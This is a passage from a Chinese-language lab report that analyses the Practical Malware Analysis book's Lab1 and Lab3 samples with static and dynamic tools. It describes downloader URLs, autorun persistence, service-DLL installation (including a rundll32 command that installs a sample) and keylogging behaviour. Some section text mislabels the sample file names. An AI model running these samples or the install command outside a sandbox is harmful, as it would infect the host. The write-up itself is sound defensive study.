<h4 id="2-2-5-strings-查看可执行文件的可打印字符串"><a href="#2-2-5-strings-查看可执行文件的可打印字符串" class="headerlink" title="2.2.5 strings 查看可执行文件的可打印字符串"></a>2.2.5 <code>strings</code> 查看可执行文件的可打印字符串</h4><p> 将 <code>strings.exe</code> 与待测文件放在一个目录下，使用命令 <code>.\strings.exe Lab01-02.exe</code>：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108150830182.png" alt="image-20230108150830182"></p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108150902411.png" alt="image-20230108150902411"></p>
<p>我们可以发现该恶意代码的网络迹象：通过 <code>Malservice</code> 服务名称（邮寄服务）、网络链接、浏览器类型，可以通过监视网络流量检查被恶意代码感染的主机。</p>
<h3 id="2-3-Lab1-03"><a href="#2-3-Lab1-03" class="headerlink" title="2.3 Lab1-03"></a>2.3 <code>Lab1-03</code></h3><h4 id="2-3-1-扫描实验文件"><a href="#2-3-1-扫描实验文件" class="headerlink" title="2.3.1 扫描实验文件"></a>2.3.1 扫描实验文件</h4><p>使用<a target="_blank" rel="noopener" href="https://www.virscan.org/">VirScan - 多引擎文件在线检测平台</a>扫描实验文件：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108151556716.png" alt="image-20230108151556716"></p>
<p>从扫描结果来看，可以确认该文件是病毒文件。</p>
<h4 id="2-3-2-确认文件的编译时间"><a href="#2-3-2-确认文件的编译时间" class="headerlink" title="2.3.2 确认文件的编译时间"></a>2.3.2 确认文件的编译时间</h4><p>我们使用 <code>PETools</code> 工具进行分析。</p>
<p>在 <code>PE</code> 头的 <code>_IMAGE_FILE_HEADER</code> 结构体中，<code>TimeDateStamp</code> 这个字段记录了文件的创建时间。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108151809920.png" alt="image-20230108151809920"></p>
<p>查看 <code>Labe1-02.exe</code> 文件的创建时间是1970年1月1日。显然该创建时间是伪造的。</p>
<h4 id="2-3-3-检查文件是否被加壳"><a href="#2-3-3-检查文件是否被加壳" class="headerlink" title="2.3.3 检查文件是否被加壳"></a>2.3.3 检查文件是否被加壳</h4><p>我们使用 <code>PEiD</code> 软件进行检查。发现程序利用 <code>FSG1.0</code> 进行加壳操作：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108151853575.png" alt="image-20230108151853575"></p>
<p>我们使用万能脱壳工具软件进行脱壳：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108152129655.png" alt="image-20230108152129655"></p>
<p>脱壳完成后，我们重新将该文件拖入 <code>PEiD</code> 软件中，可以看到该程序是用 <code>Microsoft Visual C++ 6.0</code> 编写的：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108152244017.png" alt="image-20230108152244017"></p>
<h4 id="2-3-4-查看导入函数"><a href="#2-3-4-查看导入函数" class="headerlink" title="2.3.4 查看导入函数"></a>2.3.4 查看导入函数</h4><p>我们使用 <code>PEiD</code> 软件查看导入函数。我们将 <code>Labe1-03.exe</code> 拖入，并查看导入表：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108152747896.png" alt="image-20230108152747896"></p>
<p><code>OleInitialize</code> 是一个 <code>Windows API</code> 函数。它的作用是在当前单元（<code>apartment</code>）初始化组件对象模型（<code>COM</code>）库，将当前的并发模式标识为 <code>STA</code>（<code>single-thread apartment</code>——单线程单元），并启用一些特别用于OLE技术的额外功能。除了 <code>CoGetMalloc</code> 和内存分配函数，应用程序必须在调用 <code>COM</code>库函数之前初始化 <code>COM</code> 库。我们结合下节内容分析程序的功能。</p>
<h4 id="2-3-5-IDA分析"><a href="#2-3-5-IDA分析" class="headerlink" title="2.3.5 IDA分析"></a>2.3.5 <code>IDA</code>分析</h4><p>我们将该文件拖到 <code>IDA</code> 进行分析，找到 <code>main</code> 函数：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108152551527.png" alt="image-20230108152551527"></p>
<p>观察到 <code>psz</code> 的值指向一个网络链接：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108152619580.png" alt="image-20230108152619580"></p>
<p>这个程序的主要目的就是通过COM接口访问一个网址 <a target="_blank" rel="noopener" href="http://www.malwareanalysisbook.com/ad.html">http://www.malwareanalysisbook.com/ad.html</a></p>
<h3 id="2-4-Lab1-04"><a href="#2-4-Lab1-04" class="headerlink" title="2.4 Lab1-04"></a>2.4 <code>Lab1-04</code></h3><h4 id="2-4-1-扫描实验文件"><a href="#2-4-1-扫描实验文件" class="headerlink" title="2.4.1 扫描实验文件"></a>2.4.1 扫描实验文件</h4><p>使用<a target="_blank" rel="noopener" href="https://www.virscan.org/">VirScan - 多引擎文件在线检测平台</a>扫描实验文件：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108153026282.png" alt="image-20230108153026282"></p>
<p>从扫描结果来看，可以确认该文件是病毒文件。</p>
<h4 id="2-4-2-确认文件的编译时间"><a href="#2-4-2-确认文件的编译时间" class="headerlink" title="2.4.2 确认文件的编译时间"></a>2.4.2 确认文件的编译时间</h4><p>我们使用 <code>PETools</code> 工具进行分析。</p>
<p>在 <code>PE</code> 头的 <code>_IMAGE_FILE_HEADER</code> 结构体中，<code>TimeDateStamp</code> 这个字段记录了文件的创建时间。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108153107451.png" alt="image-20230108153107451"></p>
<p>查看 <code>Labe1-02.exe</code> 文件的创建时间是2019年8月30日。该 <code>Lab</code> 的编写时间早于该值，可以断定该文件的创建时间是伪造的。</p>
<h4 id="2-4-3-检查文件是否被加壳"><a href="#2-4-3-检查文件是否被加壳" class="headerlink" title="2.4.3 检查文件是否被加壳"></a>2.4.3 检查文件是否被加壳</h4><p>我们使用 <code>PEiD</code> 软件进行检查。发现没有加壳：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108153343117.png" alt="image-20230108153343117"></p>
<p>可以看到该程序是用 <code>Microsoft Visual C++ 6.0</code> 编写的。</p>
<h4 id="2-4-4-查看导入函数"><a href="#2-4-4-查看导入函数" class="headerlink" title="2.4.4 查看导入函数"></a>2.4.4 查看导入函数</h4><p>我们使用 <code>PEiD</code> 软件查看导入函数。我们将 <code>Labe1-04.exe</code> 拖入，并查看导入表：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108153620393.png" alt="image-20230108153620393"></p>
<p>另外，还有以下 <code>API</code>：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108153645124.png" alt="image-20230108153645124"></p>
<ul>
<li>对资源节进行操作：<code>LoadResource</code>、<code>FileResource</code>、<code>SizeofResource</code></li>
<li>从资源节中加载数据，写一个文件到磁盘上：<code>CreateFile</code>,<code>WriteFile</code></li>
<li>执行磁盘上的文件：<code>WinExec</code></li>
<li>将文件写到系统目录：<code>GetWindowsDirectory</code></li>
<li>获得进程的文件描述符，也是为了操作远程的进程：<code>OpenProcess</code>、<code>GetCurrentProcess</code></li>
<li>可以运行另一个程序：<code>WinExec</code></li>
</ul>
<p>查看另一个程序调用的<code>DLL</code>文件 <code>ADVAPI32.dll</code>：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108153827096.png" alt="image-20230108153827096"></p>
<ul>
<li>可以通过令牌的方式确保只运行一个进程在系统中：<code>AdjustTokenPrivileges</code></li>
<li>可以去查找用户的登录信息等系统敏感信息：<code>LookupPrigilegeValueA</code></li>
</ul>
<h4 id="2-4-5-strings-查看可执行文件的可打印字符串"><a href="#2-4-5-strings-查看可执行文件的可打印字符串" class="headerlink" title="2.4.5 strings 查看可执行文件的可打印字符串"></a>2.4.5 <code>strings</code> 查看可执行文件的可打印字符串</h4><p> 将 <code>strings.exe</code> 与待测文件放在一个目录下，使用命令 <code>.\strings.exe Lab01-04.exe</code>：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108154310973.png" alt="image-20230108154310973"></p>
<p>其中存在 <code>GetWindowsDirectoryA</code> 以及 <code>\system32\wupdmgrd.exe</code>，并且经过搜索，系统中并不存在相关可执行文件，可以猜测恶意代码获取文件夹地址后创建或修改该文件。</p>
<h4 id="2-4-6-检测和抽取资源"><a href="#2-4-6-检测和抽取资源" class="headerlink" title="2.4.6 检测和抽取资源"></a>2.4.6 检测和抽取资源</h4><p>我们使用 <code>Resource Hacker</code> 工具来查看这个文件：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108154750044.png" alt="image-20230108154750044"></p>
<p>可以看出在<code>BIN</code>目录下有个<code>101:1033</code></p>
<p>我们将这个资源节里的代码导出来保存，再用 <code>IDA</code> 来分析：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108155104570.png" alt="image-20230108155104570"></p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108155121406.png" alt="image-20230108155121406"></p>
<p>我们可以发现这个导出的恶意代码里面包含了一个网址，和 <code>wupdmgrd.exe</code> 和 <code>winup.exe</code>。</p>
<p>我们也可以通过这个<a target="_blank" rel="noopener" href="http://www.practicalmalwareanalysis.com/updater.exe，结合第四节导入函数的分析来断定这是下载木马的程序，木马就是">http://www.practicalmalwareanalysis.com/updater.exe，结合第四节导入函数的分析来断定这是下载木马的程序，木马就是</a> <code>updater.exe</code> ，在网络中的位置就是www.practicalmalwareanalysis.com。</p>
<h2 id="三、Lab3-分析"><a href="#三、Lab3-分析" class="headerlink" title="三、Lab3 分析"></a>三、<code>Lab3</code> 分析</h2><h3 id="3-1-Lab3-01"><a href="#3-1-Lab3-01" class="headerlink" title="3.1 Lab3-01"></a>3.1 <code>Lab3-01</code></h3><h4 id="3-1-1-扫描实验文件"><a href="#3-1-1-扫描实验文件" class="headerlink" title="3.1.1 扫描实验文件"></a>3.1.1 扫描实验文件</h4><p>使用<a target="_blank" rel="noopener" href="https://www.virscan.org/">VirScan - 多引擎文件在线检测平台</a>扫描实验文件：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108163813066.png" alt="image-20230108163813066"></p>
<p>从扫描结果来看，可以确认该文件是病毒文件。</p>
<h4 id="3-1-2-确认文件的编译时间"><a href="#3-1-2-确认文件的编译时间" class="headerlink" title="3.1.2 确认文件的编译时间"></a>3.1.2 确认文件的编译时间</h4><p>我们使用 <code>PETools</code> 工具进行分析。</p>
<p>在 <code>PE</code> 头的 <code>_IMAGE_FILE_HEADER</code> 结构体中，<code>TimeDateStamp</code> 这个字段记录了文件的创建时间。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108163858886.png" alt="image-20230108163858886"></p>
<p>查看 <code>Lab3-01.exe</code> 文件的创建时间是2008年1月6日。</p>
<h4 id="3-1-3-检查加壳情况与进行准备工作"><a href="#3-1-3-检查加壳情况与进行准备工作" class="headerlink" title="3.1.3 检查加壳情况与进行准备工作"></a>3.1.3 检查加壳情况与进行准备工作</h4><p>我们使用 <code>PEiD</code> 软件进行检查：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108164042564.png" alt="image-20230108164042564"></p>
<p>我们发现程序被加壳。尝试用万能脱壳工具进行脱壳，发现脱壳失败：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108164232199.png" alt="image-20230108164232199"></p>
<p>我们只能尝试其他分析方式。我们用 <code>PEid</code> 软件查看导入函数，发现只有很少的导入函数：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108165829787.png" alt="image-20230108165829787"></p>
<p>使用 <code>IDA</code> 软件查看该程序的字符串：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108170042701.png" alt="image-20230108170042701"></p>
<p>前面大部分的字符串都是乱码，但是后面的字符串中可以看出这里有个网址，还有一个<code>vmx32to64.exe</code>，还有一些注册表的位置。</p>
<p>我们猜测，程序可能会通过连接访问该网址下载某些木马文件或者通过 <code>vmx32to64.exe</code> 下载打开某些后门，所以在接下来的动态分析中重点关注注册表修改信息和文件的增加删除以及联网操作。</p>
<h4 id="3-1-4-进行动态分析"><a href="#3-1-4-进行动态分析" class="headerlink" title="3.1.4 进行动态分析"></a>3.1.4 进行动态分析</h4><p>使用 <code>Regshot</code> 进行注册表分析：</p>
<p>拍摄第一次快照后运行 <code>Lab03-01.exe</code>：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110114051796.png" alt="image-20230110114051796" style="zoom:67%;" /></p>
<p>运行 <code>Lab03-01.exe</code> 后记录第二次快照：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110114118698.png" alt="image-20230110114118698" style="zoom:67%;" /></p>
<p>点击 <code>Compare</code> 按钮将两次注册表信息对比后发现新增注册表键值发现在自启动项 <code>VideoDriver</code> 中增加了键值 <code>43 3A 5C 57 49 4E 44 4F 57 53 5C 73 79 73 74 65 6D 33 32 5C 76 6D 78 33 32 74 6F 36 34 2E 65 78 65</code>，将它换成字符为 <code>C:\WINDOWS\system32\vmx32to64.exe</code>，说明 <code>VideoDriver</code> 自启动项就是指向 <code>system32</code>目录下的 <code>vmx32to64.exe</code>。</p>
<p>使用 <code>process explorer</code> 分析：</p>
<p>打开 <code>explorer</code> 的下端窗口查看 <code>DLLs</code> 动态链接库：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110115104982.png" alt="image-20230110115104982" style="zoom:67%;" /></p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110115901769.png" alt="image-20230110115901769"></p>
<p>在 <code>Lab03-01.exe</code> 中存在 <code>ws2_32.dll</code> 和 <code>wshtcpip.dll</code>，所以说明存在网络方面的操作。</p>
<p>我们<strong>使用Process Monitor工具监视样本操作行为</strong>，过滤出 <code>Lab03-01.exe</code>：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110125912045.png" alt="image-20230110125912045"></p>
<p>再将 <code>Lab03-01.exe</code> 的设置键项和写文件的操作过滤出来：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110131133303.png" alt="image-20230110131133303"></p>
<p>可以看到，程序在目录 <code>C:\WINDOWS\System32\</code> 下创建了一个程序 <code>vmx32to64.exe</code>：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110131246689.png" alt="image-20230110131246689"></p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110131300510.png" alt="image-20230110131300510"></p>
<p>添加了一个自启动项，且该启动项指向程序 <code>C:\WINDOWS\System32\vmx32to64.exe</code>：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110131340915.png" alt="image-20230110131340915"></p>
<p>使用工具 <code>WinMD5</code> 工具查看 <code>vmx32to64.exe</code> 与 <code>Lab03-01.exe</code> 的 <code>MD5</code> 值：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110131420915.png" alt="image-20230110131420915"></p>
<p>两个程序的 <code>MD5</code> 值一样，说明 <code>Lab03-01.exe</code> 将自己复制到了 <code>C:\WINDOWS\System32</code> 目录下，并重命名为 <code>vmx32to64.exe</code>。</p>
<p>我们使用 <code>ApateDNS</code> 进行分析。在 <code>Kali</code> 虚拟机上开启 <code>Inetsim</code>：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110131631745.png" alt="image-20230110131631745"></p>
<p>在实验机中填写虚拟机 <code>Kali</code> 的 <code>IP</code>，并开始服务：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110131740479.png" alt="image-20230110131740479"></p>
<p>运行 <code>Lab03-01.exe</code>，发现其访问了网址：www.practicalmalwareanalysis.com</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110131939513.png" alt="image-20230110131939513"></p>
<h3 id="3-2-Lab3-02"><a href="#3-2-Lab3-02" class="headerlink" title="3.2 Lab3-02"></a>3.2 <code>Lab3-02</code></h3><h4 id="3-2-1-扫描实验文件"><a href="#3-2-1-扫描实验文件" class="headerlink" title="3.2.1 扫描实验文件"></a>3.2.1 扫描实验文件</h4><p>使用<a target="_blank" rel="noopener" href="https://www.virscan.org/">VirScan - 多引擎文件在线检测平台</a>扫描实验文件：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110132011011.png" alt="image-20230110132011011"></p>
<p>从扫描结果来看，可以确认该文件是病毒文件。</p>
<h4 id="3-2-2-确认文件的编译时间"><a href="#3-2-2-确认文件的编译时间" class="headerlink" title="3.2.2 确认文件的编译时间"></a>3.2.2 确认文件的编译时间</h4><p>我们使用 <code>PETools</code> 工具进行分析。</p>
<p>在 <code>PE</code> 头的 <code>_IMAGE_FILE_HEADER</code> 结构体中，<code>TimeDateStamp</code> 这个字段记录了文件的创建时间。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110132131733.png" alt="image-20230110132131733"></p>
<p>查看 <code>Lab3-02.dll</code> 文件的创建时间是2010年9月28日。</p>
<h4 id="3-2-3-检查加壳情况与进行准备工作"><a href="#3-2-3-检查加壳情况与进行准备工作" class="headerlink" title="3.2.3 检查加壳情况与进行准备工作"></a>3.2.3 检查加壳情况与进行准备工作</h4><p>我们使用 <code>PEiD</code> 软件进行检查文件是否被加壳：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110132415754.png" alt="image-20230110132415754"></p>
<p>可以看到，该程序未加壳，是用 <code>Microsoft Visual C++ 6.0</code> 编写的。</p>
<p>我们用 <code>PEid</code> 软件查看导入函数，首先分析 <code>Kernel32.dll</code> 中的 <code>API</code> 函数：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110132739680.png" alt="image-20230110132739680"></p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110132753326.png" alt="image-20230110132753326"></p>
<p>由以上两个 <code>API</code> 函数可知，程序会创建进程和线程。</p>
<p>分析 <code>Advapi32.dll</code>的 <code>API</code> 函数：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110133250798.png" alt="image-20230110133250798"></p>
<p>发现程序可以创建服务、操控服务、操作注册表。</p>
<p>分析 <code>Wininet.dll</code>的 <code>API</code> 函数：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110133349632.png" alt="image-20230110133349632"></p>
<p>发现程序可以对网络进行操作。</p>
<p>接着对导出表分析，发现下面5个导出函数：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110133440198.png" alt="image-20230110133440198"></p>
<p>然后就是查看其中的字符串信息了。使用 <code>IDA</code> 查看程序的字符串信息：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110133737482.png" alt="image-20230110133737482"></p>
<p>发现了网址信息。还有一些程序信息：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110133814433.png" alt="image-20230110133814433"></p>
<p>猜测这个程序是恶意程序自主运行的。</p>
<p>程序中还有一些下载文件的、运行程序的，还包括之前的导出函数：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110133924318.png" alt="image-20230110133924318"></p>
<p>程序还有注册表操作：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110134008975.png" alt="image-20230110134008975"></p>
<h4 id="3-2-4-进行动态分析"><a href="#3-2-4-进行动态分析" class="headerlink" title="3.2.4 进行动态分析"></a>3.2.4 进行动态分析</h4><p>我们进行相应的注册表分析。在运行 <code>Lab03-02.dll</code> 前利用 <code>Regshot</code> 记录一下注册表信息：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110135037209.png" alt="image-20230110135037209"></p>
<p>Windows系统中的 <code>rundll32.exe</code> 专用于运行 <code>dll</code> 程序，就先用导出函数中的 <code>installA</code> 来尝试安装程序，</p>
<p><code>rundll32.exe Lab03-02.dll,installA</code></p>
<p>我们在 <code>Windows</code> 自带的注册表编辑器中发现安装成功，安装了一个名为 <code>ServiceDll</code> 的文件：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110134705058.png" alt="image-20230110134705058"></p>
<p>在 <code>Regshot</code> 中点击 <code>compare</code> 按钮，对比运行 <code>Lab03-02.dll</code> 前后的变化：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110135144404.png" alt="image-20230110135144404"></p>
<p>在<code>key added</code> 中发现增加了一个 <code>IPRIP</code> 的服务，说明 <code>Lab03-02.dll</code> 将自己安装成一个 <code>IPRIP</code> 服务，并且 <code>dll</code> 需要一个可执行程序来执行它，在注册表中发现了 <code>svchost.exe</code> 执行程序，加重了是它运行的嫌疑。该恶意代码执行时显示的名字为“<code>Intranet Network Awareness(NIA+)</code>”。</p>
<p>我们使用 <code>ApateDNS</code> 进行虚拟网络分析</p>
<p>配置好 <code>kali</code> 和 <code>winxp</code> 的虚拟网络，开启 <code>ApateDNS</code>，并在 <code>kali</code> 中用 <code>nc</code> 监听80端口，然后可以使用 <code>net start</code> 开启 <code>IPRIP</code> 服务：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110135453233.png" alt="image-20230110135453233"></p>
<p>启动 <code>IPRIP</code> 服务后发现 <code>Lab03-02.dll</code> 访问了 <code>practicalmalwareanalysis.com</code> 网址：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110135516201.png" alt="image-20230110135516201"></p>
<p>在 <code>Kali</code> 虚拟机中监听到以下信息：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110135524744.png" alt="image-20230110135524744"></p>
<p>发现它会请求获取 <code>serve.html</code> 网页文件，成功验证之前的网络服务猜测。</p>
<p>开启 <code>IPRIP</code> 服务后 <code>ctrl+F</code> 搜索 <code>Lab03-02.dll</code> 后，发现 <code>Lab03-02.dll</code> 确实附着在 <code>svchost.exe</code> 上运行，其 <code>pid</code> 为1028，可以确定 <code>Lab03-02.dll</code> 就是通过 <code>svchost.exe</code> 执行的：</p>
<p>通过 <code>process explorer</code> 分析，找到1028程序，确实在它的里面找到了 <code>Lab03-02.dll</code>：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110135815200.png" alt="image-20230110135815200"></p>
<p>总结前面的分析，<code>Lab03-02.dll</code> 通过 <code>svchost.exe</code> 运行把自己安装成一个 <code>IPRIP</code> 服务，该服务的作用是向 <code>practicalmalwareanalysis.com</code> 发送了一个 <code>HTTP GET</code> 请求，获取 <code>serve.html</code> 页面。</p>
<h3 id="3-3-Lab3-03"><a href="#3-3-Lab3-03" class="headerlink" title="3.3 Lab3-03"></a>3.3 <code>Lab3-03</code></h3><h4 id="3-3-1-扫描实验文件"><a href="#3-3-1-扫描实验文件" class="headerlink" title="3.3.1 扫描实验文件"></a>3.3.1 扫描实验文件</h4><p>使用<a target="_blank" rel="noopener" href="https://www.virscan.org/">VirScan - 多引擎文件在线检测平台</a>扫描实验文件：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110140001728.png" alt="image-20230110140001728"></p>
<p>从扫描结果来看，可以确认该文件是病毒文件。</p>
<h4 id="3-3-2-确认文件的编译时间"><a href="#3-3-2-确认文件的编译时间" class="headerlink" title="3.3.2 确认文件的编译时间"></a>3.3.2 确认文件的编译时间</h4><p>我们使用 <code>PETools</code> 工具进行分析。</p>
<p>在 <code>PE</code> 头的 <code>_IMAGE_FILE_HEADER</code> 结构体中，<code>TimeDateStamp</code> 这个字段记录了文件的创建时间。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110140710952.png" alt="image-20230110140710952"></p>
<p>查看 <code>Lab3-01.exe</code> 文件的创建时间是2011年4月8日。</p>
<h4 id="3-3-3-检查文件是否被加壳"><a href="#3-3-3-检查文件是否被加壳" class="headerlink" title="3.3.3 检查文件是否被加壳"></a>3.3.3 检查文件是否被加壳</h4><p>我们使用 <code>PEiD</code> 软件进行检查文件是否被加壳：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110141208033.png" alt="image-20230110141208033"></p>
<p>可以看到，该程序未加壳，是用 <code>Microsoft Visual C++ 6.0</code> 编写的。</p>
<h4 id="3-3-4-进行动态分析"><a href="#3-3-4-进行动态分析" class="headerlink" title="3.3.4 进行动态分析"></a>3.3.4 进行动态分析</h4><p>在打开 <code>Lab03-03.exe</code> 之前，先开监控软件，进行监控。</p>
<p>在process monitor中，发现程序一启动，就有大量的 <code>svchost.exe</code>。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110143440030.png" alt="image-20230110143440030"></p>
<p>在 <code>process explorer</code> 中，可以看到<code>svchost.exe</code> 程序，且每次运行该程序都会多一个 <code>svchost.exe</code> ，然后该进程自动结束：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110143930877.png" alt="image-20230110143930877"></p>
<p>当进一步查看 <code>string</code> 内容的时候，发现一个 <code>log</code> 文件以及一些类似于键盘命令的字符串，但是在 <code>image</code> 的模式下并没有出现过：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110144047803.png" alt="image-20230110144047803"></p>
<p>我们分析该病毒的感染特征。在 <code>process explorer</code> 查得其 <code>PID</code> 为3224：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110144535343.png" alt="image-20230110144535343"></p>
<p>在 <code>Process Monitor</code> 中对 <code>PID</code> 进行过滤，分析 <code>svchost.exe</code> 的操作特征。我们发现其频繁的对 <code>log</code> 文件进行了操作：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110144446804.png" alt="image-20230110144446804"></p>
<p>查看了下目录，发现其创建了一个文件：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110144718975.png" alt="image-20230110144718975"></p>
<p>打开 <code>practicalmalwareanalysis.txt</code> 文件，观察里面的文件内容：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110144742804.png" alt="image-20230110144742804"></p>
<p>发现我们在 <code>process monitor</code> 上面的操作被记录。我们猜测该程序有监控键盘，记录键盘、鼠标等监控功能。于是我在桌面建立一个 <code>txt</code> ，并输入一些内容，再次打开 <code>practicalmalwareanalysis.txt</code> 文件：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110144907654.png" alt="image-20230110144907654"></p>
<p>综合以上的分析，我们推测程序的功能是：监控记录用户的键盘记录，可能是为了获得用户的账号密码。一般来说，获取用户键盘记录后，会将其进行网络传输，但该程序尚未进行网络传输。</p>
<h3 id="3-4-Lab3-04"><a href="#3-4-Lab3-04" class="headerlink" title="3.4 Lab3-04"></a>3.4 <code>Lab3-04</code></h3><h4 id="3-4-1-扫描实验文件"><a href="#3-4-1-扫描实验文件" class="headerlink" title="3.4.1 扫描实验文件"></a>3.4.1 扫描实验文件</h4><p>使用<a target="_blank" rel="noopener" href="https://www.virscan.org/">VirScan - 多引擎文件在线检测平台</a>扫描实验文件：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110140022844.png" alt="image-20230110140022844"></p>
<p>从扫描结果来看，可以确认该文件是病毒文件。</p>
<h4 id="3-4-2-确认文件的编译时间"><a href="#3-4-2-确认文件的编译时间" class="headerlink" title="3.4.2 确认文件的编译时间"></a>3.4.2 确认文件的编译时间</h4><p>我们使用 <code>PETools</code> 工具进行分析。</p>
<p>在 <code>PE</code> 头的 <code>_IMAGE_FILE_HEADER</code> 结构体中，<code>TimeDateStamp</code> 这个字段记录了文件的创建时间。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110145309207.png" alt="image-20230110145309207"></p>
<p>查看 <code>Lab3-01.exe</code> 文件的创建时间是2011年10月18日。</p>
<h4 id="3-4-3-检查文件是否被加壳"><a href="#3-4-3-检查文件是否被加壳" class="headerlink" title="3.4.3 检查文件是否被加壳"></a>3.4.3 检查文件是否被加壳</h4><p>我们使用 <code>PEiD</code> 软件进行检查文件是否被加壳：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230110145401551.png" alt="image-20230110145401551"></p>
<p>可以看到，该程序未加壳，是用 <code>Microsoft Visual C++ 6.0</code> 编写的。</p>
<h4 id="3-4-4-程序分析"><a href="#3-4-4-程序分析" class="headerlink" title="3.4.4 程序分析"></a>3.4.4 程序分析</h4><p>我们查看导入表：</p>
